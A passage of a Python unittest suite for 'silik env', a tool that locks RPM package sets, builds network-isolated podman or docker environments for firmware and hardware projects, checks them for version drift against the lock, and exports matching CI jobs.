        self.assertTrue(all(cp[s]["gpgcheck"] == "1" for s in cp.sections()))

    def test_a_large_lock_stays_under_the_size_of_a_command_line(self):
        def many(l):
            p = l["packages"][0]
            l["packages"] = [dict(p, name="pkg%04d" % i, nevra="pkg%04d-1.0-1.el9.x86_64" % i, location="Packages/pkg%04d-1.0-1.el9.x86_64.rpm" % i,
                                  sha256="%064x" % i) for i in range(1500)]
        lock = self.relock(many)
        cf = self.recipe()
        runs = [b for b in re.split(r"\n(?=RUN )", cf) if b.startswith("RUN ")]
        self.assertGreater(len(runs), 1)
        self.assertLess(max(len(b) for b in runs), 131072)
        self.assertEqual(cf.count("pkg1499-1.0-1.el9.x86_64.rpm'"), 1)

    def test_a_repository_without_a_key_is_said_and_the_others_signatures_still_read(self):
        def loose(l):
            l["repos"].append({"id": "silikos", "baseurl": "file:///run/silik-env-repo/silikos/", "frozen": True, "folder": "rpms"})
            l["packages"][-1]["repo"] = "silikos"
        lock = self.relock(loose)
        cf = self.recipe()
        self.assertIn("--mount=type=bind,from=repo-silikos,target=/run/silik-env-repo/silikos", cf)
        self.assertIn("rpmkeys --checksig $(cat $d/signed)) | grep -v ' digests signatures OK$'", cf)
        self.assertIn("packages from a repository without a key: 1.", cf)
        self.assertIn("--setopt=localpkg_gpgcheck=0", cf)
        work = os.path.join(self.d, "inside")
        subprocess.run(["sh", "-c", "set -eu\nd=%s\n" % work + "\n".join(env.data_lines(env.read_lock(self.proj)))], check=True)
        self.assertEqual(len(cat(os.path.join(work, "signed")).split()), 12)
        self.silik("env", "build")
        b = [c for c in self.calls() if c[0] == "build"][0]
        self.assertEqual(b[b.index("--build-context") + 1], "repo-silikos=" + os.path.join(self.proj, "rpms"))
        rc, out, _ = self.silik("env", "export", "--ci", "github")                   # (a folder inside the project: the CI job sees it)
        self.assertIn("--build-context repo-silikos=rpms", out)
        self.assertEqual(self.silik("env", "export", "--ci", "gitlab")[0], 2)


class Run(Case):
    def setUp(self):
        super().setUp()
        shutil.copy(os.path.join(FW, "silik.env.lock"), self.proj)
        self.state(labels={"localhost/silik-env/fw:32b7591e3088": json.loads(cat(os.path.join(FW, "silik.env.lock")))["image"]})

    def run_call(self, *argv, cwd=None):
        rc, out, err = self.silik("-q", "env", *argv, cwd=cwd)
        calls = [c for c in self.calls() if c[0] in ("run", "build")]
        return rc, calls, err

    def test_no_network_the_project_at_the_same_path_the_lock_s_environment(self):
        with mock.patch.object(os, "getuid", return_value=0):
            rc, calls, _ = self.run_call("run", "--", "cmake", "--build", "build", "-q")
        self.assertEqual(rc, 0)
        self.assertEqual(calls, [["run", "--rm", "-i", "--network", "none", "--hostname", "silik-env", "--security-opt", "label=disable",
                                  "-v", "%s:%s" % (self.proj, self.proj), "-w", self.proj, "-e", "HOME=/tmp",
                                  "-e", "LANG=C.UTF-8", "-e", "SOURCE_DATE_EPOCH=1793013231", "-e", "TZ=UTC",
                                  "localhost/silik-env/fw:32b7591e3088", "cmake", "--build", "build", "-q"]])      # (-q after -- is the command's)
        sub = os.path.join(self.proj, "src")
        os.mkdir(sub)
        rc, calls, _ = self.run_call("run", "--net", "--", "make", cwd=sub)
        self.assertEqual(calls[0][calls[0].index("--network") + 1], "host")
        self.assertEqual(calls[0][calls[0].index("-w") + 1], sub)

    def test_the_user_s_uid_inside(self):
        with mock.patch.object(os, "getuid", return_value=1000), mock.patch.object(os, "getgid", return_value=1000):
            _, calls, _ = self.run_call("run", "--", "make")
            self.assertIn("keep-id", calls[0])                                     # rootless podman: the same uid inside
            self.assertNotIn("--user", calls[0])
            self.state(version="Docker version 29.9.2, build a82e528")              # (podman as a name of docker, or $SILIK_ENV_RUNNER)
            _, calls, _ = self.run_call("run", "--", "make")
            self.assertEqual(calls[0][calls[0].index("--user") + 1], "1000:1000")
            self.assertNotIn("--userns", calls[0])

    def test_the_command_s_exit_code_and_the_usage(self):
        self.state(run_rc=7)
        self.assertEqual(self.run_call("run", "--", "false")[0], 7)
        rc, calls, err = self.run_call("run")
        self.assertEqual((rc, calls), (2, []))
        self.assertIn("silik env run [--net] -- COMMAND", err)

    def test_it_builds_first_when_the_image_is_not_there(self):
        self.state(labels={})
        rc, calls, _ = self.run_call("run", "--", "make")
        self.assertEqual([c[0] for c in calls], ["build", "run"])

    def test_enter_is_a_shell_with_a_terminal(self):
        _, calls, _ = self.run_call("enter")
        self.assertEqual(calls[0][:4] + calls[0][-1:], ["run", "--rm", "-i", "-t", "/bin/bash"])
        self.assertEqual(calls[0][calls[0].index("--network") + 1], "none")

    def test_silik_env_changed_after_the_lock_is_said_and_the_lock_is_what_runs(self):
        self.write(cat(os.path.join(self.proj, "silik.env")) + "ninja-build\n")
        rc, calls, err = self.run_call("run", "--", "make")
        self.assertEqual((rc, len(calls)), (0, 1))
        self.assertIn("silik.env changed after silik.env.lock was made", err)

    def test_mounts_read_only_and_the_bench_s_devices(self):
        self.relock(lambda l: l.update(mounts=["/opt/vendor"], devices={"usb": True, "serial": True, "display": False}))
        self.state(labels={"localhost/silik-env/fw:32b7591e3088": self.lock()["image"]})
        import glob
        with mock.patch.object(os.path, "isdir", side_effect=lambda p: p == "/dev/bus/usb" or os.path.exists(p)), \
             mock.patch.object(glob, "glob", side_effect=lambda p: ["/dev/ttyACM0"] if "ACM" in p else []), \
             mock.patch.object(os, "getuid", return_value=1000):
            _, calls, _ = self.run_call("run", "--", "openocd", "-f", "board.cfg")
            c = calls[0]
            self.assertIn("/opt/vendor:/opt/vendor:ro", c)
            self.assertIn("/dev/bus/usb:/dev/bus/usb", c)                          # the probes: libusb opens them there
            self.assertEqual(c[c.index("--device") + 1], "/dev/ttyACM0")             # the serial ports there are now
            self.assertEqual(c[c.index("--group-add") + 1], "keep-groups")
            self.assertNotIn("--device-cgroup-rule", c)                             # (rootless: the nodes' own rights decide)
            self.state(version="Docker version 29.9.2")
            _, calls, _ = self.run_call("run", "--", "openocd")
            self.assertEqual(calls[0][calls[0].index("--device-cgroup-rule") + 1], "c 189:* rwm")
            self.assertNotIn("--group-add", calls[0])
        # nothing of the bench unless the file asks
        self.assertEqual(env.device_flags("podman", {"devices": {"usb": False, "serial": False, "display": False}}, False), [])


class Check(Case):
    def setUp(self):
        super().setUp()
        shutil.copy(os.path.join(FW, "silik.env.lock"), self.proj)
        self.key = json.loads(cat(os.path.join(FW, "silik.env.lock")))["image"]
        self.state(labels={"localhost/silik-env/fw:32b7591e3088": self.key})

    def rows(self):
        rc, out, _ = self.silik("-q", "env", "check", "--json")
        d = json.loads(out)
        self.assertEqual(d["ok"], rc == 0)
        return rc, {r["what"]: r for r in d["rows"]}

    def test_the_image_of_the_real_run_is_the_lock_s(self):
        rc, out, _ = self.silik("-q", "env", "check")
        self.assertEqual(rc, 0, out)
        self.assertRegex(out, r"gcc-arm-linux-gnu\s+12\.1\.1-1\.el9\s+ok\s+12\.1\.1-1\.el9")
        self.assertRegex(out, r"packages\s+171\s+ok\s+171")
        self.assertIn("the environment is the lock's", out)
        self.assertIn("SOURCE_DATE_EPOCH=1793013231", out)
        rc, rows = self.rows()
        self.assertEqual((rc, sorted(rows)), (0, ["cmake", "gcc-arm-linux-gnu", "image", "make", "packages", "silik.env"]))
        self.assertTrue(all(r["state"] == "ok" for r in rows.values()))
        self.assertEqual([c for c in self.calls() if c[0] == "run"][0][:4], ["run", "--rm", "--network", "none"])

    def qa(self, change):
        path = os.path.join(self.fake, "rpmqa")
        with open(path) as f:
            text = change(f.read())
        with open(path, "w") as f:
            f.write(text)

    def test_a_tool_at_another_version_is_drift_and_exit_1(self):
        self.qa(lambda t: t.replace("cmake 0 3.31.8 3.el9 x86_64", "cmake 0 3.26.5 2.el9 x86_64"))
        rc, rows = self.rows()
        self.assertEqual(rc, 1)
        self.assertEqual((rows["cmake"]["state"], rows["cmake"]["lock"], rows["cmake"]["found"]), ("drift", "3.31.8-3.el9", "3.26.5-2.el9"))
        self.assertEqual(rows["packages"]["state"], "drift")
        self.assertIn("cmake-3.31.8-3.el9.x86_64", rows["packages"]["found"])
        self.assertEqual(rows["make"]["state"], "ok")
        for lang, word in (("en", "is NOT the lock's: 2 of 6 rows"), ("ca", "NO és el del lock: 2 de 6 files"), ("es", "NO es el del lock: 2 de 6 filas")):
            with mock.patch.dict(os.environ, {"SILIK_LANG": lang}):
                self.assertIn(word, self.silik("-q", "env", "check")[1])

    def test_a_package_more_or_less_or_a_base_package_changed_is_drift(self):
        self.qa(lambda t: t + "htop 0 3.3.0 1.el9 x86_64\n")
        rc, rows = self.rows()
        self.assertEqual((rc, rows["packages"]["state"]), (1, "drift"))
        self.assertIn("htop-3.3.0-1.el9.x86_64", rows["packages"]["found"])
        self.qa(lambda t: t.replace("htop 0 3.3.0 1.el9 x86_64\n", "").replace("bash 0 5.1.8 9.el9 x86_64", "bash 0 5.1.8 10.el9 x86_64"))
        rc, rows = self.rows()
        self.assertEqual((rc, rows["packages"]["state"], rows["cmake"]["state"]), (1, "drift", "ok"))
        self.qa(lambda t: "\n".join(l for l in t.splitlines() if not l.startswith("make ")) + "\n")
        rc, rows = self.rows()
        self.assertEqual((rows["make"]["state"], rows["make"]["found"]), ("drift", "not installed"))

    def test_no_image_or_another_lock_s_image(self):
        self.state(labels={})
        rc, rows = self.rows()
        self.assertEqual((rc, rows["image"]["state"], rows["packages"]["state"]), (1, "missing", "missing"))
        self.assertIn("silik env build", rows["image"]["found"])
        self.state(labels={"localhost/silik-env/fw:32b7591e3088": "f" * 64})
        rc, rows = self.rows()
        self.assertEqual((rc, rows["image"]["state"]), (1, "drift"))

    def test_what_cannot_be_asked_is_unknown_not_ok(self):
        self.state(run_rc=125)
        rc, rows = self.rows()
        self.assertEqual((rc, rows["packages"]["state"]), (1, "unknown"))

    def test_silik_env_changed_after_the_lock_is_drift(self):
        self.write(cat(os.path.join(self.proj, "silik.env")) + "ninja-build\n")
        rc, rows = self.rows()
        self.assertEqual((rc, rows["silik.env"]["state"]), (1, "drift"))

    def test_the_vendor_s_tool_and_the_python_packages(self):
        h = "87cc5225657524ec6361354be928adfd56bcf2a3dcc646c40f8f094c39c07db4"
        self.relock(lambda l: l.update(mounts=["/opt/vendor"], versions={"tool": {"command": "cat /opt/vendor/VERSION", "output": "tool 2024.1"}},
                                       pip=[{"name": "intelhex", "version": "2.3.0", "file": "intelhex-2.3.0-py2.py3-none-any.whl", "sha256": h}]))
        self.state(labels={"localhost/silik-env/fw:" + self.lock()["image"][:12]: self.lock()["image"]}, out={"cat /opt/vendor/VERSION 2>&1": "tool 2024.1\n"})
        put(os.path.join(self.fake, "piplist"), "pip==21.3.1\nintelhex==2.3.0\n")
        rc, rows = self.rows()
        self.assertEqual((rc, rows["tool"]["state"], rows["intelhex (pip)"]["state"]), (0, "ok", "ok"))
        self.state(out={"cat /opt/vendor/VERSION 2>&1": "tool 2024.2\n"})
        put(os.path.join(self.fake, "piplist"), "pip==21.3.1\nintelhex==2.2.1\n")
        rc, rows = self.rows()
        self.assertEqual((rc, rows["tool"]["state"], rows["tool"]["found"], rows["intelhex (pip)"]["state"]), (1, "drift", "tool 2024.2", "drift"))

    def test_every_project_locked_on_this_machine(self):
        rc, out, _ = self.silik("-q", "env", "list")
        self.assertIn("no project locked here yet", out)
        self.silik("-q", "env", "lock")
        rc, out, _ = self.silik("-q", "env", "list", "--json", cwd=self.d)
        self.assertEqual(json.loads(out), [{"project": self.proj, "name": "fw", "image": "localhost/silik-env/fw:32b7591e3088", "packages": 13, "built": True}])
        rc, out, _ = self.silik("-q", "env", "check", "--all", cwd=self.d)
        self.assertEqual(rc, 0)
        self.assertIn(self.proj + "\n", out)
        self.qa(lambda t: t.replace("cmake 0 3.31.8", "cmake 0 3.30.0"))
        self.assertEqual(self.silik("-q", "env", "check", "--all", cwd=self.d)[0], 1)


class Export(Case):
    def setUp(self):
        super().setUp()
        shutil.copy(os.path.join(FW, "silik.env.lock"), self.proj)
        self.lock_sha = env.sha256(cat(os.path.join(FW, "silik.env.lock"), "rb"))

    def test_a_github_job_from_the_same_lock_with_plain_commands(self):
        rc, out, err = self.silik("-q", "env", "export", "--ci", "github")
        self.assertEqual(rc, 0, err)
        self.assertEqual(self.calls(), [])                                            # (it prints; it runs nothing)
        self.assertIn("run: echo '%s  silik.env.lock' | sha256sum -c -" % self.lock_sha, out)       # the job is of this lock
        self.assertIn("docker build --network host -t silik-env:32b7591e3088 -f - . <<'SILIK_ENV_CONTAINERFILE'", out)
        body = out.split("<<'SILIK_ENV_CONTAINERFILE'\n")[1].split("          SILIK_ENV_CONTAINERFILE")[0]
        self.assertEqual("\n".join(l[10:] for l in body.rstrip("\n").split("\n")) + "\n", env.containerfile(env.read_lock(self.proj)))
        self.assertIn('docker run --rm --network none --user "$(id -u):$(id -g)" -v "$PWD:$PWD" -w "$PWD" -e HOME=/tmp -e LANG=C.UTF-8 '
                      "-e SOURCE_DATE_EPOCH=1793013231 -e TZ=UTC silik-env:32b7591e3088 sh -c 'cmake --fresh -S . -B build && cmake --build build "
                      "--clean-first && sha256sum build/fw.elf'", out)
        self.assertNotIn("silik env run", out)                                        # (no action or tool of ours on the runner)
        self.assertNotIn("uses: silik", out)
        self.assertNotIn("\t", out)

    def test_a_gitlab_job_in_the_base_image_by_digest(self):
        rc, out, _ = self.silik("-q", "env", "export", "--ci", "gitlab")
        self.assertEqual(rc, 0)
        self.assertIn("  image: " + REF, out)
        self.assertIn('    SOURCE_DATE_EPOCH: "1793013231"', out)
        self.assertIn("    - echo '%s  silik.env.lock' | sha256sum -c -" % self.lock_sha, out)
        for l in env.install_script(env.read_lock(self.proj)):
            self.assertIn("      " + l + "\n", out)
        self.assertIn('  script:\n    - "cmake --fresh -S . -B build', out)

    def test_the_recipe_alone(self):
        rc, out, _ = self.silik("-q", "env", "export", "--containerfile")
        self.assertEqual((rc, out), (0, env.containerfile(env.read_lock(self.proj))))
        self.assertEqual(self.silik("-q", "env", "export")[0], 2)


class Init(Case):
    def setUp(self):
        super().setUp()
        os.remove(os.path.join(self.proj, "silik.env"))

    def tree(self, *files):
        for f in files:
            name, _, text = f.partition("=")
            os.makedirs(os.path.dirname(os.path.join(self.proj, name)), exist_ok=True)
            with open(os.path.join(self.proj, name), "w") as fh:
                fh.write(text)

    def init(self, have, *argv):
        with mock.patch.object(silik, "rpm_versions", side_effect=lambda pkgs: {k: v for k, v in have.items() if k in pkgs}):
            return self.silik("env", "init", *argv)

    def test_the_kinds_of_project_by_their_files(self):
        self.assertEqual(env.detect(self.proj), [])
        self.tree("CMakeLists.txt=project(app C)\n", "cmake/toolchain.cmake=set(CMAKE_C_COMPILER arm-none-eabi-gcc)\n")
        self.assertEqual(env.detect(self.proj), ["firmware"])
        self.tree("hw/board.kicad_pro={}")
        self.assertEqual(env.detect(self.proj), ["firmware", "kicad"])
        for files, kinds in ((["west.yml=manifest:\n"], ["zephyr"]), (["app/CMakeLists.txt=find_package(Zephyr REQUIRED)\n"], ["zephyr"]),
                             (["Makefile=all:\n", "rtl/top.sv=module top; endmodule\n"], ["hdl"]), (["Makefile=all:\n", "cpu.vhd=\n"], ["hdl"]),
                             (["Makefile=all:\n", "main.c=\n"], ["generic"]), (["CMakeLists.txt=project(x)\n"], ["generic"]),
                             (["build/CMakeLists.txt=arm-none-eabi\n", "README=\n"], [])):
            shutil.rmtree(self.proj)
            os.mkdir(self.proj)
            self.tree(*files)
            self.assertEqual(env.detect(self.proj), kinds, files)

    def test_the_starter_lists_what_is_on_this_system_at_its_versions_and_guesses_none(self):
        self.tree("CMakeLists.txt=project(app C)\n", "cmake/toolchain.cmake=set(CMAKE_C_COMPILER arm-none-eabi-gcc)\n")
        rc, out, err = self.init({"cmake": "3.31.8", "make": "4.3", "arm-none-eabi-gcc-cs": "12.4.0", "openocd": "0.12.0", "bash": "5.1.8"})
        self.assertEqual(rc, 0, err)
        text = cat(os.path.join(self.proj, "silik.env"))
        self.assertIn("\ncmake = 3.31.8\nmake = 4.3\narm-none-eabi-gcc-cs = 12.4.0\n", text)
        self.assertIn("\nepel = yes\n", text)                                         # (the compiler is EPEL's)
        self.assertIn("\n# arm-none-eabi-newlib\n", text)                             # not on this system: named, no version
        self.assertIn("\n# [silikos]\n# openocd = 0.12.0\n", text)                    # SilikOS's own: needs its repository said
        self.assertNotIn("bash", text)
        # every version in the file was read from this system
        self.assertEqual(sorted(re.findall(r"^#? ?[a-z0-9+-]+ = (\d[\w.]*)$", text, re.M)), ["0.12.0", "12.4.0", "3.31.8", "4.3"])
        self.assertIn("\nusb = yes\nserial = yes\n", text)
        self.assertIn("3 tools of it are on this system", out)
        self.assertIn("$ rpm -q --qf", out)
        # and it is a file `silik env lock` reads
        spec = env.read_env(self.proj)
        self.assertEqual([(s["name"], s["want"]) for s in spec["specs"]], [("cmake", "3.31.8"), ("make", "4.3"), ("arm-none-eabi-gcc-cs", "12.4.0")])
        self.assertEqual(spec["devices"], {"usb": True, "serial": True, "display": False})
        # a line uncommented is a package
        self.write(text.replace("# arm-none-eabi-newlib\n", "arm-none-eabi-newlib\n"))
        self.assertIn("arm-none-eabi-newlib", [s["name"] for s in env.read_env(self.proj)["specs"]])

    def test_none_of_the_tools_here_none_listed(self):
        self.tree("Makefile=all:\n", "top.v=module top; endmodule\n")
        rc, out, err = self.init({})
        self.assertEqual(rc, 0)
        text = cat(os.path.join(self.proj, "silik.env"))
        self.assertIn("none of its tools is installed here", err)
        self.assertEqual(re.findall(r"^[a-z0-9+-]+( = .*)?$", text[text.index("[packages]"):text.index("[environment]")], re.M), [])
        self.assertIn("# iverilog\n", text)
        self.assertIn("# epel = yes\n", text)
        self.assertNotIn("[devices]", text.replace("# [devices]", ""))

    def test_it_does_not_write_over_a_file_and_dry_run_writes_none(self):
        self.tree("Makefile=all:\n", "main.c=\n")
        rc, out, _ = self.init({"make": "4.3"}, "--dry-run")
        self.assertEqual(rc, 0)
        self.assertIn("make = 4.3", out)
        self.assertFalse(os.path.exists(os.path.join(self.proj, "silik.env")))
        self.assertEqual(self.init({"make": "4.3"})[0], 0)
        rc, _, err = self.init({"make": "4.4"})
        self.assertEqual(rc, 2)
        self.assertIn("already there", err)
        self.assertEqual(self.init({"make": "4.4"}, "--force")[0], 0)
        self.assertIn("make = 4.4", cat(os.path.join(self.proj, "silik.env")))

    def test_no_project_no_file(self):
        rc, _, err = self.init({"make": "4.3"})
        self.assertEqual(rc, 2)
        self.assertIn("no project recognised", err)


class Plugin(unittest.TestCase):
    def test_its_words_are_its_commands(self):
        with open(PLUGIN) as f:
            head = f.read(800)
        words = re.search(r"^# words: (.+)$", head, re.M).group(1).split()
        out = io.StringIO()
        with contextlib.redirect_stdout(out), self.assertRaises(SystemExit):
            silik.parser("env").parse_args(["env", "--help"])
        self.assertEqual(sorted(words), sorted(re.search(r"\{([a-z,]+)\}", out.getvalue()).group(1).split(",")))

    def test_python_3_9_and_the_standard_library_only(self):
        import ast
        with open(PLUGIN) as f:
            tree = ast.parse(f.read(), feature_version=(3, 9))
        std = {"json", "os", "re", "shlex", "sys", "hashlib", "configparser", "subprocess", "glob", "argparse"}
        for node in ast.walk(tree):
            if isinstance(node, (ast.Import, ast.ImportFrom)):
                names = [node.module] if isinstance(node, ast.ImportFrom) else [n.name for n in node.names]
                self.assertTrue(set(names) <= std, names)
        ast.parse(env.RESOLVER, feature_version=(3, 9))

    def test_the_three_languages_have_the_same_texts(self):
        self.assertEqual(sorted(env.TEXT), ["ca", "en", "es"])
        self.assertEqual(sorted(env.TEXT["ca"]), sorted(env.TEXT["en"]))
        self.assertEqual(sorted(env.TEXT["es"]), sorted(env.TEXT["en"]))

    def test_the_doc_and_the_status_rows(self):
        with open(os.path.join(ROOT, "docs/ENV.md"), encoding="utf-8") as f:
            doc = f.read()
        for word in ("silik env init", "silik env lock", "silik env build", "silik env run", "silik env check", "silik env export",
                     "SOURCE_DATE_EPOCH", "vault.almalinux.org", "nix", "IIC-OSIC-TOOLS", "Not the kernel", "ISO 26262"):
            self.assertIn(word, doc)
        with open(os.path.join(ROOT, "docs/STATUS.md"), encoding="utf-8") as f:
            self.assertIn("silik env", f.read())


@unittest.skipUnless(os.environ.get("SILIK_ENV_REAL"), "SILIK_ENV_REAL=1: a real container runtime and the real repositories")
class Real(unittest.TestCase):
    """the whole way on a real runtime (podman; or SILIK_ENV_RUNNER=docker): lock, lock again, build, run without
    network, check. About 3 MB of packages (make and tio), an image of the base's size"""

    def test_lock_build_run_check(self):
        d = tempfile.mkdtemp()
        self.addCleanup(shutil.rmtree, d)
        with open(os.path.join(d, "silik.env"), "w") as f:
            f.write("[env]\nname = silik-env-test\n[repos]\nepel = yes\n[packages]\nmake\ntio\n")

        def run(*argv):
            return subprocess.run([sys.executable, os.path.join(ROOT, "packages/silik-tools/files/silik"), "-q", "env"] + list(argv) + ["-C", d],
                                  stdout=subprocess.PIPE, universal_newlines=True)
        self.assertEqual(run("lock").returncode, 0)
        first = cat(os.path.join(d, "silik.env.lock"))
        self.assertEqual(run("lock").returncode, 0)
        self.assertEqual(cat(os.path.join(d, "silik.env.lock")), first)
        self.assertEqual(run("build").returncode, 0)
        lock = json.loads(first)
        tag = "localhost/silik-env/silik-env-test:" + lock["image"][:12]
        self.addCleanup(subprocess.run, [os.environ.get("SILIK_ENV_RUNNER") or "podman", "rmi", tag], stdout=subprocess.DEVNULL)
        r = subprocess.run([sys.executable, os.path.join(ROOT, "packages/silik-tools/files/silik"), "-q", "env", "run", "-C", d, "--", "sh", "-c",
                            "tio --version && echo $SOURCE_DATE_EPOCH && ! curl -s -m 3 https://repo.almalinux.org/ > /dev/null"],
                           stdout=subprocess.PIPE, universal_newlines=True)
        self.assertEqual(r.returncode, 0, r.stdout)
        self.assertIn(lock["environment"]["SOURCE_DATE_EPOCH"], r.stdout)
        self.assertEqual(run("check").returncode, 0)


if __name__ == "__main__":
    unittest.main()
